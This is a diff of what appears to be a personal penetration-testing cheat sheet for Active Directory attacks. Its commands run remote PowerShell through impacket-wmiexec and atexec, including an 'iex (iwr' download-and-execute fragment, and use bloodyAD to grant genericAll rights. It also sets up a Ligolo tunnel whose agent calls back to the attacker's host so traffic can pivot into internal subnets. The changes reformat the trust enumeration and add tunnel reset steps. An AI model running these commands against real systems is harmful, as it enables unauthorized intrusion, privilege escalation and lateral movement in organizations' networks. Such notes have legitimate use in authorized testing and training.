@@ -726,7 +726,7 @@ kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -us
 
 +---------- Forest Trust ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
-impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select-Object name,objectguid,securityIdentifier\""
+impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; @(Get-ADDomain | Select @{n='Name';e={$_.DNSRoot}},@{n='securityIdentifier';e={$_.DomainSID}},@{n='trustType';e={'Primary'}},@{n='trustDirection';e={'Inbound/Outbound'}}; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select @{n='Name';e={$_.Name}},@{n='securityIdentifier';e={$_.securityIdentifier}},@{n='trustType';e={switch ($_.trustType){1{'NT'}2{'Active Directory'}3{'External'}default{$_}}}},@{n='trustDirection';e={switch ($_.trustDirection){1{'Inbound'}2{'Outbound'}3{'Bidirectional'}default{$_}}}}) | Format-Table -AutoSize\""
 
 +---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
@@ -1431,6 +1431,7 @@ python3 -m http.server 139 -d /Upload
 scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 139 -d /Upload
 
 ## Ligolo - Port Forward and Pivot
+-->> New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
 chmod +x agent;
 ./agent -ignore-cert -connect $MYIP:443
@@ -1441,7 +1442,12 @@ ifconfig
 interface_add_route --name ligolo --route 240.0.0.1/32
 interface_add_route --name ligolo --route 192.168.110.51/24
 
--->> Single Host: Attack Forwarded Ports
+-->> Reset Configuration
+stop
+interface_delete --name ligolo
+start
+
+-->> Single Host: Attack Forwarded Host
 chromium 240.0.0.1:3000
 curl 240.0.0.1:5000
 
